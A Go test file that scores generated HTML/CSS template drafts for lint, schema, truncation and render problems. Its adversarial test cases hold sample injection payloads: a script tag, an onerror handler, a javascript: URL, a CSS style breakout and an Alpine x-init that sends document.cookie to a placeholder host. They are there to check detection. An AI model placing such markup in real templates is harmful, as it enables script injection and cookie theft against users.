package templateeval

import (
	"reflect"
	"strings"
	"testing"

	"mahresources/mrql"
	"mahresources/shortcodes"
)

func pairCase() Case {
	return Case{ID: "t-pair", Kind: KindPair, Carrier: "group", Slot: "CustomHeader", Prompt: "x"}
}

func pairDraft(html, css string, issues ...shortcodes.LintIssue) Draft {
	return Draft{Status: 200, Target: "bundle", Valid: true, Slots: map[string]string{"CustomHeader": html, "CustomHeaderCSS": css}, Issues: issues}
}

func okPreview(html string) map[string]Preview {
	return map[string]Preview{"CustomHeader": {Status: 200, HTML: html}}
}

func TestScoreChecks(t *testing.T) {
	known := shortcodes.KnownFromBuiltins()
	metaCase := Case{ID: "t-meta", Kind: KindMetaSchema, Carrier: "group", Prompt: "x", ExpectFields: []string{"isbn"}}
	metaDraft := func(schema string) Draft {
		return Draft{Status: 200, Target: "metaschema", Valid: true, Content: schema}
	}
	advCase := pairCase()
	advCase.Adversarial = true
	cssCase := Case{ID: "t-css", Kind: KindSlot, Carrier: "group", Slot: "CustomCSS", Prompt: "x"}
	bundleCase := Case{ID: "t-bundle", Kind: KindBundle, Carrier: "note", Prompt: "x"}

	tests := []struct {
		name     string
		c        Case
		draft    Draft
		calls    []Call
		previews map[string]Preview
		check    func(t *testing.T, got Checks)
		pass     bool
	}{
		{
			name: "clean pair passes", c: pairCase(),
			draft:    pairDraft(`<h1>[meta path="author"]</h1>`, `.h{}`),
			previews: okPreview(`<h1>Ann</h1>`),
			pass:     true,
		},
		{
			name: "provider error", c: pairCase(),
			draft: Draft{Status: 502, Error: "template generation provider error"},
			check: func(t *testing.T, got Checks) {
				if got.ProviderError == "" || got.HTTPStatus != 502 {
					t.Fatalf("provider error not recorded: %#v", got)
				}
			},
		},
		{
			name: "lint errors and warnings", c: pairCase(),
			draft: pairDraft(`<h1>x</h1>`, ``,
				shortcodes.LintIssue{Severity: shortcodes.SeverityError, Message: "[conditional] must be a block: [conditional]…[/conditional]"},
				shortcodes.LintIssue{Severity: shortcodes.SeverityWarning, Message: `[meta] has both hide-empty and default; hide-empty wins and the default is never shown`}),
			previews: okPreview(`<h1>x</h1>`),
			check: func(t *testing.T, got Checks) {
				if got.LintErrors != 1 || got.LintWarnings != 1 {
					t.Fatalf("lint counts = %d/%d", got.LintErrors, got.LintWarnings)
				}
			},
		},
		{
			name: "unknown attribute warning does not fail", c: pairCase(),
			draft:    pairDraft(`<h1>x</h1>`, ``, shortcodes.LintIssue{Severity: shortcodes.SeverityWarning, Message: `unknown attribute "colour" on [meta]`}),
			previews: okPreview(`<h1>x</h1>`),
			check: func(t *testing.T, got Checks) {
				if got.UnknownAttributes != 1 {
					t.Fatalf("unknown attributes = %d", got.UnknownAttributes)
				}
			},
			pass: true,
		},
		{
			name: "MRQL error", c: pairCase(),
			draft:    pairDraft(`<h1>x</h1>`, ``, shortcodes.LintIssue{Severity: shortcodes.SeverityError, Message: "MRQL error in query: bad"}),
			previews: okPreview(`<h1>x</h1>`),
			check: func(t *testing.T, got Checks) {
				if got.MRQLErrors != 1 {
					t.Fatalf("mrql errors = %d", got.MRQLErrors)
				}
			},
		},
		{
			name: "unknown shortcode far from any built-in", c: pairCase(),
			draft:    pairDraft(`<div>[star-rating value="4"] [meta path="a"] [plugin:x:y] [/rating]</div>`, `a[href]{} [data-x="y"]{}`),
			previews: okPreview(`<div>stars</div>`),
			check: func(t *testing.T, got Checks) {
				want := []string{"plugin:x:y", "rating", "star-rating"}
				if !reflect.DeepEqual(got.UnknownShortcodes, want) {
					t.Fatalf("unknown shortcodes = %v, want %v", got.UnknownShortcodes, want)
				}
			},
		},
		{
			name: "CSS attribute selectors are not shortcodes", c: cssCase,
			draft: Draft{Status: 200, Target: "slot", Valid: true, Content: `[hidden]{display:none} input[type="text"]{} [data-theme="dark"] .x{}`},
			pass:  true,
		},
		{
			name: "metaschema compile failure", c: metaCase,
			draft: metaDraft(`{"type":"object","properties":{"isbn":{"type":"nope"}}}`),
			check: func(t *testing.T, got Checks) {
				if got.SchemaCompileError == "" {
					t.Fatal("compile failure not recorded")
				}
			},
		},
		{
			name: "fixture meta fails generated schema", c: metaCase,
			draft: metaDraft(`{"type":"object","properties":{"isbn":{"type":"string"}},"required":["isbn","missingField"]}`),
			check: func(t *testing.T, got Checks) {
				if got.FixtureMetaInvalid == 0 {
					t.Fatal("fixture validation failure not counted")
				}
			},
		},
		{
			name: "empty schema cannot pass", c: metaCase,
			draft: metaDraft(`{}`),
			check: func(t *testing.T, got Checks) {
				if got.SchemaProperties != 0 || len(got.MissingExpectFields) != 1 {
					t.Fatalf("got %#v", got)
				}
			},
		},
		{
			name: "schema missing an expected field", c: metaCase,
			draft: metaDraft(`{"type":"object","properties":{"author":{"type":"string"}}}`),
			check: func(t *testing.T, got Checks) {
				if !reflect.DeepEqual(got.MissingExpectFields, []string{"isbn"}) {
					t.Fatalf("missing = %v", got.MissingExpectFields)
				}
			},
		},
		{
			name: "schema with the expected field passes", c: metaCase,
			draft: metaDraft(`{"type":"object","properties":{"author":{"type":"string"},"isbn":{"type":"string"}}}`),
			check: func(t *testing.T, got Checks) {
				if got.FieldCoverage != 1 {
					t.Fatalf("coverage = %v", got.FieldCoverage)
				}
			},
			pass: true,
		},
		{
			name: "incomplete pair in the raw provider output", c: pairCase(),
			draft: Draft{Status: 502, Error: "template generation provider error"},
			calls: []Call{{FinishReason: "stop", Content: `{"slots":{"CustomHeader":"<p>x</p>"},"explanation":"e"}`}},
			check: func(t *testing.T, got Checks) {
				if got.IncompletePairs != 1 {
					t.Fatalf("incomplete pairs = %d", got.IncompletePairs)
				}
			},
		},
		{
			name: "bundle coverage", c: bundleCase,
			draft:    Draft{Status: 200, Target: "bundle", Valid: true, Slots: map[string]string{"CustomHeader": "<p>x</p>", "CustomHeaderCSS": ""}},
			previews: map[string]Preview{"CustomHeader": {Status: 200, HTML: "<p>x</p>"}},
			check: func(t *testing.T, got Checks) {
				if got.RequestedSlots != len(BundleSlots("note")) || got.ReturnedSlots != 2 || got.BundleCoverage <= 0 || got.BundleCoverage >= 1 {
					t.Fatalf("coverage %#v", got)
				}
			},
			pass: true,
		},
		{
			name: "truncation from finish reason", c: pairCase(),
			draft:    pairDraft(`<h1>x</h1>`, ``),
			calls:    []Call{{FinishReason: "length"}},
			previews: okPreview(`<h1>x</h1>`),
			check: func(t *testing.T, got Checks) {
				if !got.Truncated {
					t.Fatal("truncation not detected")
				}
			},
		},
		{
			name: "truncation from the bundle degrade issue", c: bundleCase,
			draft: Draft{Status: 200, Target: "bundle", Issues: []shortcodes.LintIssue{{Severity: shortcodes.SeverityError, Message: "The whole-template response was too large or malformed. Try generating slots individually."}}},
			check: func(t *testing.T, got Checks) {
				if !got.Truncated {
					t.Fatal("truncation not detected")
				}
			},
		},
		{
			name: "render-empty slot", c: pairCase(),
			draft:    pairDraft(`<div class="c"><h2>[meta path="missing" hide-empty="true"]</h2></div>`, ``),
			previews: okPreview("<div class=\"c\"><h2></h2></div>\n<!-- c -->"),
			check: func(t *testing.T, got Checks) {
				if !reflect.DeepEqual(got.RenderEmptySlots, []string{"CustomHeader"}) {
					t.Fatalf("render-empty = %v", got.RenderEmptySlots)
				}
			},
		},
		{
			name: "an image is not empty", c: pairCase(),
			draft:    pairDraft(`<img src="/x">`, ``),
			previews: okPreview(`<img src="/x">`),
			pass:     true,
		},
		{
			name: "leftover shortcode text", c: pairCase(),
			draft:    pairDraft(`<p>[property path="Name"]</p>`, ``),
			previews: okPreview(`<p>[property path=Name]</p>`),
			check: func(t *testing.T, got Checks) {
				if !reflect.DeepEqual(got.LeftoverShortcodeText, []string{"CustomHeader"}) {
					t.Fatalf("leftover = %v", got.LeftoverShortcodeText)
				}
			},
		},
		{
			name: "preview error issue and render error marker", c: pairCase(),
			draft: pairDraft(`<p>x</p>`, ``),
			previews: map[string]Preview{"CustomHeader": {Status: 200, HTML: `<p>x</p><span class="mrql-error text-red-700 font-mono">bad</span>`,
				Issues: []shortcodes.LintIssue{{Severity: shortcodes.SeverityError, Message: "boom"}}}},
			check: func(t *testing.T, got Checks) {
				if got.PreviewErrors != 2 {
					t.Fatalf("preview errors = %d", got.PreviewErrors)
				}
			},
		},
		{
			name: "a lint error the preview repeats is counted once, under lint", c: pairCase(),
			draft: pairDraft(`<p>x</p>`, ``, shortcodes.LintIssue{Severity: shortcodes.SeverityError, Message: "MRQL error in query: bad"}),
			previews: map[string]Preview{"CustomHeader": {Status: 200, HTML: `<p>x</p>`,
				Issues: []shortcodes.LintIssue{{Severity: shortcodes.SeverityError, Message: "MRQL error in query: bad"}}}},
			check: func(t *testing.T, got Checks) {
				if got.PreviewErrors != 0 || got.LintErrors != 1 {
					t.Fatalf("preview errors = %d, lint errors = %d", got.PreviewErrors, got.LintErrors)
				}
			},
		},
		{
			name: "field coverage is heuristic and does not gate markup", c: pairCase(),
			draft:    pairDraft(`<p>[meta path="author"]</p>`, ``),
			previews: okPreview(`<p>Ann</p>`),
			check: func(t *testing.T, got Checks) {
				if got.FieldCoverage <= 0 || got.FieldCoverage >= 1 {
					t.Fatalf("coverage = %v", got.FieldCoverage)
				}
			},
			pass: true,
		},
		{
			name: "script tag flags an adversarial case", c: advCase,
			draft:    pairDraft(`<p>x</p><SCRIPT>fetch('https://example.invalid')</SCRIPT>`, ``),
			previews: okPreview(`<p>x</p>`),
			check:    wantFlags("script"),
		},
		{
			name: "inline event handler", c: advCase,
			draft:    pairDraft(`<img src="x" onerror="alert(1)">`, ``),
			previews: okPreview(`<img src="x">`),
			check:    wantFlags("event-handler"),
		},
		{
			name: "Alpine attribute with a network call", c: advCase,
			draft:    pairDraft(`<div x-init="fetch('https://example.invalid/?d='+document.cookie)">x</div><button @click="location='https://e.invalid'">b</button>`, ``),
			previews: okPreview(`<div>x</div>`),
			check:    wantFlags("alpine-network"),
		},
		{
			name: "harmless Alpine toggle is not flagged", c: advCase,
			draft:    pairDraft(`<div x-data="{open:false}"><button @click="open = !open">t</button></div>`, ``),
			previews: okPreview(`<div>t</div>`),
			pass:     true,
		},
		{
			name: "javascript URL", c: advCase,
			draft:    pairDraft(`<a href="JavaScript:alert(1)">x</a>`, ``),
			previews: okPreview(`<a>x</a>`),
			check:    wantFlags("javascript-url"),
		},
		{
			name: "style breakout in CSS", c: advCase,
			draft:    pairDraft(`<p>x</p>`, `.a{}</style><div x-init="1">`),
			previews: okPreview(`<p>x</p>`),
			check:    wantFlags("style-breakout"),
		},
		{
			name: "executable markup is recorded but does not gate a normal case", c: pairCase(),
			draft:    pairDraft(`<p>x</p><script>console.log(1)</script>`, ``),
			previews: okPreview(`<p>x</p>`),
			check:    wantFlags("script"),
			pass:     true,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := Score(tt.c, tt.draft, tt.calls, tt.previews, known)
			if tt.check != nil {
				tt.check(t, got)
			}
			if got.Pass() != tt.pass {
				t.Fatalf("Pass() = %v, want %v; checks %#v", got.Pass(), tt.pass, got)
			}
		})
	}
}

func wantFlags(flags ...string) func(t *testing.T, got Checks) {
	return func(t *testing.T, got Checks) {
		t.Helper()
		if !reflect.DeepEqual(got.ExecutableMarkup, flags) {
			t.Fatalf("executable markup = %v, want %v", got.ExecutableMarkup, flags)
		}
	}
}

// TestLintMessagePrefixesStayClassified lints known-bad markup with the real
// linter. Score classifies issues by message prefix, so a rewording in
// shortcodes/lint.go must fail here rather than silently zero a metric.
func TestLintMessagePrefixesStayClassified(t *testing.T) {
	opts := shortcodes.LintOptions{
		Known:        shortcodes.KnownFromBuiltins(),
		ValidateMRQL: func(q string) error { _, err := mrql.Parse(q); return err },
	}
	cases := []struct {
		markup string
		class  issueClass
	}{
		{`[meta path="a" colour="red"]`, classUnknownAttribute},
		{`[mrql query="type = = ="]`, classMRQL},
		{`[metta path="a"]`, classUnknownShortcode},
	}
	for _, c := range cases {
		found := false
		var messages []string
		for _, issue := range shortcodes.Lint(c.markup, opts) {
			messages = append(messages, issue.Message)
			if classifyIssue(issue) == c.class {
				found = true
			}
		}
		if !found {
			t.Errorf("%s: no issue classified as %v; lint said %s", c.markup, c.class, strings.Join(messages, " | "))
		}
	}
}
